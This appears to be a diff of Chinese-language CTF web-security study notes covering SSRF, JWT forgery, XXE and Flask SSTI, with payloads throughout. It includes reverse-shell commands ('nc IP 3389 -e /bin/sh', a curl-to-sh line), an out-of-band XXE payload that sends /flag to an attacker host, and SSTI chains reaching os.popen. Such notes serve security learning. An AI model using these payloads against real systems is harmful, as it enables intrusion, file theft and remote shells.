 <p>/index.php/?s=/index(模块)/index(控制器)/ctfshow(方法)</p>
 <p>构造POP链：<strong>熟悉代码</strong></p>
 <h2 id="ssrf服务端请求伪造">ssrf服务端请求伪造</h2>
 <p>控制服务器使用指定协议访问指定的URL。</p>
 <p>条件：url外部可控；<strong>服务端有接收url并进行访问的功能</strong>。（header()函数的功能是实现重定向，针对客户端多次访问，不属于ssrf）。</p>
-<p><strong>URL格式：schema:[//authority]/path[?query]
-[#fragment]</strong></p>
+<p><strong>URL格式：schema:[//authority]/path[?query] [#fragment]</strong></p>
 <p>schema—表示协议</p>
 <p>://—表示分隔</p>
 <p>authority—[userinfo@]host[:port]</p>
 <figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs tex">userinfo@默认使用匿名账户，可以省略，格式为username:password@，如果支持匿名账户，说明支持任意用户名和密码<br>:port为端口号，默认为80，可以省略<br></code></pre></td></tr></table></figure>
 <p>利用：</p>
-<ol type="1">
+<ol>
 <li>任意文件读取，必须知道文件名，可以使用<strong>file:///etc/passwd</strong>进行尝试，看是否存在ssrf漏洞</li>
 <li>探测内网资源</li>
 </ol>
@@ -1177,10 +1152,10 @@ select a()等</p>
 <h4 id="php-fpm">php-fpm</h4>
 <p>监听9000端口，仅允许127.0.0.1访问，负责对php文件进行解释执行。在gopherus中exploit为<code>fastcgi</code>，输入的file必须为存在的文件，例如<code>/var/www/html/index.php</code>，执行的命令为<code>nc IP 3389 -e /bin/sh</code>或者<code>curl https://your-shell.com/IP:3389 |sh</code>。</p>
 <p>原理：通过向9000端口发送php执行请求，设置.user.ini参数，使用auto_append_file来添加php://input包含的恶意代码后执行。</p>
-<h3 id="php原生类ssrfsoap插件">php原生类ssrf（soap插件）</h3>
+<h3 id="php原生类ssrf（soap插件）">php原生类ssrf（soap插件）</h3>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$soap</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">SoapCilent</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;url&#x27;</span>]);<br><span class="hljs-variable">$soap</span>-&gt;<span class="hljs-title function_ invoke__">hack</span>();   <span class="hljs-comment">//调用SoapCilent不存在的方法，调用call()</span><br><span class="hljs-comment">//call函数会访问指定的url，但仅支持http协议</span><br></code></pre></td></tr></table></figure>
 <h3 id="ssrf绕过">ssrf绕过</h3>
-<h4 id="不允许本地访问过滤127.0.0.1">不允许本地访问，过滤127.0.0.1</h4>
+<h4 id="不允许本地访问，过滤127-0-0-1">不允许本地访问，过滤127.0.0.1</h4>
 <ul>
 <li>使用alphanumerics</li>
 </ul>
@@ -1202,30 +1177,29 @@ select a()等</p>
 <li>短网址绕过</li>
 </ul>
 <p>在线生成可替换原网址的短网址。</p>
-<h2 id="jwt">JWT</h2>
+<h2 id="JWT">JWT</h2>
 <p>cookie中token的一种，起验证的作用，设置cookie：<code>setcookie('key',value)</code>。</p>
 <p>作用过程：</p>
 <figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs tex">?username=admin<span class="hljs-built_in">&amp;</span>score=100  别人传递过程中，会对积分进行篡改 <br><br>?username=admin<span class="hljs-built_in">&amp;</span>score=100<span class="hljs-built_in">&amp;</span>token=hash(username=admin<span class="hljs-built_in">&amp;</span>score=100)  加哈希进行验证<br><br>但篡改数据的同时，破解了算法，篡改了签名<br><br>引入加盐机制，salt（保密）<br>username=admin——salt<span class="hljs-built_in">&amp;</span>score=100<span class="hljs-built_in">&amp;</span>token=hash(username=admin<span class="hljs-built_in">_</span>salt<span class="hljs-built_in">&amp;</span>score=100)<br><br>盐值有可能被爆破，也有可能被泄露<br><br>增加更复杂的哈希函数；提高盐值的长度。<br></code></pre></td></tr></table></figure>
-<h3 id="利用点-1">利用点</h3>
-<ol type="1">
+<h3 id="利用点-2">利用点</h3>
+<ol>
 <li>当不校验哈希算法时，可以替换算法为空，绕过算法校验</li>
-<li>在哈希函数中使用简单密码，可以利用c-jwt-cracker爆破工具（https://github.com/brendan-rius/c-jwt-cracker）进行爆破—linux
-docker</li>
+<li>在哈希函数中使用简单密码，可以利用c-jwt-cracker爆破工具（<a target="_blank" rel="noopener" href="https://github.com/brendan-rius/c-jwt-cracker%EF%BC%89%E8%BF%9B%E8%A1%8C%E7%88%86%E7%A0%B4%E2%80%94linux">https://github.com/brendan-rius/c-jwt-cracker）进行爆破—linux</a> docker</li>
 <li>在哈希函数中使用非对称密码：</li>
 </ol>
 <p>私钥泄露：生成任意jwt字符串</p>
 <figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> jwt = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;jsonwebtoken&#x27;</span>);  <span class="hljs-comment">//库函数</span><br><span class="hljs-keyword">const</span> fs = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;fs&#x27;</span>);<br><br><span class="hljs-keyword">var</span> privateKey = fs.<span class="hljs-title function_">readFileSync</span>(<span class="hljs-string">&#x27;private.key&#x27;</span>);<br><br><span class="hljs-keyword">var</span> token = jwt.<span class="hljs-title function_">sign</span>(&#123; <span class="hljs-attr">user</span>: <span class="hljs-string">&#x27;admin&#x27;</span> &#125;, privateKey, &#123; <span class="hljs-attr">algorithm</span>: <span class="hljs-string">&#x27;RS256&#x27;</span> &#125;);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(token)<br></code></pre></td></tr></table></figure>
 <p>公钥泄露：修改算法为对称算法，双方均使用公钥验证。</p>
-<h2 id="xxe利用">XXE利用</h2>
+<h2 id="XXE利用">XXE利用</h2>
 <p>xml实体注入，当程序处理xml文件时，没有进制对外部实体的处理，容易造成xxe漏洞，实现任意文件读取。</p>
 <p>xml文件，一般表示带有结构的数据。例如:</p>
 <figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs tex">&lt;祖父&gt;<br>	&lt;叔父1&gt;<br>	&lt;/叔父1&gt;<br>	<br>	&lt;叔父2&gt;<br>	&lt;/叔父2&gt;<br><br>&lt;/祖父&gt;<br></code></pre></td></tr></table></figure>
-<h3 id="利用-1">利用</h3>
+<h3 id="利用-2">利用</h3>
 <h4 id="有回显点">有回显点</h4>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?</span>xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span><span class="hljs-meta">?&gt;</span><br>&lt;!DOCTYPE hacker[<br>    &lt;!ENTITY hacker SYSTEM <span class="hljs-string">&quot;file:///flag&quot;</span>&gt;<br>]&gt; <br><br>&lt;root&gt;<br>    &lt;ctfshow&gt;     <span class="hljs-comment">//题目中明确访问的属性</span><br>        &amp;hacker;<br>    &lt;/ctfshow&gt;<br>&lt;/root&gt;<br></code></pre></td></tr></table></figure>
 <h4 id="无回显点">无回显点</h4>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?</span>xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span><span class="hljs-meta">?&gt;</span><br>&lt;!DOCTYPE hacker[<br>    &lt;!ENTITY  % file SYSTEM <span class="hljs-string">&quot;php://filter/read=convert.base64-encode/resource=/flag&quot;</span>&gt;<br>    &lt;!ENTITY  % myurl SYSTEM <span class="hljs-string">&quot;http://IP/test.dtd&quot;</span>&gt;<br>    %myurl;<br>]&gt; <br>&lt;root&gt;<br><span class="hljs-number">1</span><br>&lt;/root&gt;<br><br>test.dtd内容：<br><br>&lt;!ENTITY % dtd <span class="hljs-string">&quot;&lt;!ENTITY &amp;#x25; vps SYSTEM &#x27;http://IP:3389/%file;&#x27;&gt; &quot;</span>&gt;<br>%dtd;<br>%vps;<br><br><br><span class="hljs-comment">//文件内容过长会读取失败</span><br><span class="hljs-comment">//IP本机监听3389端口 nc -lvvnp 3389</span><br></code></pre></td></tr></table></figure>
-<h2 id="ssti服务器模版注入">SSTI服务器模版注入</h2>
+<h2 id="SSTI服务器模版注入">SSTI服务器模版注入</h2>
 <h3 id="python理论">python理论</h3>
 <p>指定编码方式：</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#-*- coding: utf-8 -*-</span><br></code></pre></td></tr></table></figure>
@@ -1235,8 +1209,12 @@ docker</li>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;aa\</span><br><span class="hljs-string">bb\</span><br><span class="hljs-string">cc&quot;</span>)<br><br>//输出aabbcc<br></code></pre></td></tr></table></figure>
 <h4 id="数据结构">数据结构</h4>
 <ul>
-<li><p>数字: complex 复数 1+2j 1.1+2.2j</p></li>
-<li><p>字符串：</p></li>
+<li>
+<p>数字: complex 复数  1+2j 1.1+2.2j</p>
+</li>
+<li>
+<p>字符串：</p>
+</li>
 </ul>
 <figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs tex">几种形式：<br>&#x27;aa&#x27; <br>&quot;aaaa&quot;<br>&#x27;&#x27;&#x27;<br>aaaaa<br>&#x27;&#x27;&#x27;<br><br>r 标志:<br>r&#x27;aa<span class="hljs-keyword">\nbb</span>&#x27; 取消转义<br><br>可以进行+,*,也可以使用下标进行引用：<br>a[2:6:2]：左闭右开，两个取一次<br></code></pre></td></tr></table></figure>
 <ul>
@@ -1261,7 +1239,7 @@ docker</li>
 <ul>
 <li>flask模块：</li>
 </ul>
-<p>前后端交互，负责提供http服务，类似与php 的 php-fpm phpcgi ；</p>
+<p>前后端交互，负责提供http服务，类似与php 的  php-fpm  phpcgi ；</p>
 <p>具有模板渲染的函数。</p>
 <h4 id="flask开启调试">flask开启调试</h4>
 <p>如果后台开启调试，则会存在<code>http://xxx/console</code>页面，输入PIN码即可获得控制台进而执行命令；</p>
@@ -1273,13 +1251,10 @@ docker</li>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python">&gt;&gt;<span class="hljs-keyword">import</span> sys<br>&gt;&gt;<span class="hljs-keyword">import</span> os<br>&gt;&gt;os.popen(<span class="hljs-string">&#x27;ls /&#x27;</span>).read()<br>&gt;&gt;os.popen(<span class="hljs-string">&#x27;cat /flag&#x27;</span>).read()<br></code></pre></td></tr></table></figure>
 <h3 id="ssti利用条件">ssti利用条件</h3>
 <p><strong>渲染字符串可控</strong>，也就说模板的内容可控</p>
-<p>我们通过模板 语法
-相当于变相的执行了服务器上的python代码</p>
+<p>我们通过模板 语法 相当于变相的执行了服务器上的python代码</p>
 <p>渲染字符串可控通过以下函数：</p>
-<p><strong>render_template</strong> 相当于 include
-传入的时模板的名字，执行的时模板文件内的模板语法</p>
-<p><strong>render_template_string</strong> 相当于 eval
-执行传入的字符串，直接作为模板语法解析</p>
+<p><strong>render_template</strong>     相当于 include 传入的时模板的名字，执行的时模板文件内的模板语法</p>
+<p><strong>render_template_string</strong> 相当于 eval 执行传入的字符串，直接作为模板语法解析</p>
 <p>验证是否存在（POC）:</p>
 <figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs tex">1 &#123;&#123; 2*2 &#125;&#125;<br><br>2 &#123;&#123; config &#125;&#125;<br></code></pre></td></tr></table></figure>
 <h3 id="ssti引用链">ssti引用链</h3>
@@ -1289,14 +1264,14 @@ docker</li>
 <h4 id="利用链">利用链</h4>
 <figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs tex">&#123;&#123;&quot;&quot;.<span class="hljs-built_in">_</span><span class="hljs-built_in">_</span>class<span class="hljs-built_in">_</span><span class="hljs-built_in">_</span>.<span class="hljs-built_in">_</span><span class="hljs-built_in">_</span>base<span class="hljs-built_in">_</span><span class="hljs-built_in">_</span>.<span class="hljs-built_in">_</span><span class="hljs-built_in">_</span>subclasses<span class="hljs-built_in">_</span><span class="hljs-built_in">_</span>()[121].<span class="hljs-built_in">_</span><span class="hljs-built_in">_</span>init<span class="hljs-built_in">_</span><span class="hljs-built_in">_</span>.<span class="hljs-built_in">_</span><span class="hljs-built_in">_</span>globals<span class="hljs-built_in">_</span><span class="hljs-built_in">_</span>[&#x27;popen&#x27;](&#x27;ls /&#x27;).read()&#125;&#125;<br></code></pre></td></tr></table></figure>
 <h3 id="绕过过滤">绕过过滤</h3>
-<h4 id="过滤.">过滤<code>.</code></h4>
+<h4 id="过滤">过滤<code>.</code></h4>
 <figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs tex"><span class="hljs-comment">%转换为数组引用</span><br>e.g. &quot;&quot;.<span class="hljs-built_in">_</span><span class="hljs-built_in">_</span>class<span class="hljs-built_in">_</span><span class="hljs-built_in">_</span>转化为&quot;&quot;[&#x27;<span class="hljs-built_in">_</span><span class="hljs-built_in">_</span>class<span class="hljs-built_in">_</span><span class="hljs-built_in">_</span>&#x27;]<br></code></pre></td></tr></table></figure>
-<h4 id="过滤_">过滤<code>_</code></h4>
+<h4 id="过滤-2">过滤<code>_</code></h4>
 <figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs tex"><span class="hljs-comment">%定义变量，构造_</span><br>&#123;<span class="hljs-comment">% set a =(()|select|string|list).pop(24) %&#125;</span><br>测试：&#123;<span class="hljs-comment">% set a =(()|select|string|list).pop(24) %&#125; &#123;% print(a) %&#125;</span><br><span class="hljs-comment">%使用十六进制字符串进行绕过</span><br>&#123;&#123;  ()[&quot;<span class="hljs-keyword">\x</span>5f<span class="hljs-keyword">\x</span>5fclass<span class="hljs-keyword">\x</span>5f<span class="hljs-keyword">\x</span>5f&quot;]  &#125;&#125;<br></code></pre></td></tr></table></figure>
-<h4 id="过滤">过滤<code>[]</code></h4>
+<h4 id="过滤-3">过滤<code>[]</code></h4>
 <p>获取os类时的下标引用时受限</p>
 <figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs tex"><span class="hljs-built_in">_</span><span class="hljs-built_in">_</span>getitem<span class="hljs-built_in">_</span><span class="hljs-built_in">_</span>   可以把中括号换成小括号使用<br>e.g.&quot;&quot;.<span class="hljs-built_in">_</span><span class="hljs-built_in">_</span>class<span class="hljs-built_in">_</span><span class="hljs-built_in">_</span>.<span class="hljs-built_in">_</span><span class="hljs-built_in">_</span>base<span class="hljs-built_in">_</span><span class="hljs-built_in">_</span>.<span class="hljs-built_in">_</span><span class="hljs-built_in">_</span>subclasses<span class="hljs-built_in">_</span><span class="hljs-built_in">_</span>().<span class="hljs-built_in">_</span><span class="hljs-built_in">_</span>getitem<span class="hljs-built_in">_</span><span class="hljs-built_in">_</span>(121)<br></code></pre></td></tr></table></figure>
-<h4 id="过滤-1">过滤`</h4>
+<h4 id="过滤-4">过滤`</h4>
 
                 
               </div>
